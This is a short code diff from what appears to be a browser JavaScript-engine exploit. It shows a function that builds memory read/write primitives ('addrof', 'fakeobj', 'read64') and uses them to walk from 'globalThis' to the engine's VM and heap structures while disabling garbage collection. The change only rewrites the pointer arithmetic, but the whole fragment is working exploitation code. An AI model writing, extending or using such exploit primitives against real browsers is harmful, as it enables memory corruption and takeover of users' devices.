@@ -237,8 +237,8 @@ function buildDSScribblePrimitives(addrof, fakeobj) {
             proofView.setBigUint64(0x40, markerB, true);
             //DISABLE GC
             ///DISABLE WORKLET GC
-            const vm = read64(read64(addrof(globalThis).add(0x10n)).add(0x38n));
-            log("vm:" + read64(read64(addrof(globalThis).add(0x10n)).add(0x38n)));
+            const vm = read64(read64(addrof(globalThis) + 0x10n) + 0x38n);
+            log("vm:" + vm);
             const heap = vm.add(0xc0n);
             log("heap:" + heap);
             const isSafeToCollect = heap.add(0x241n);
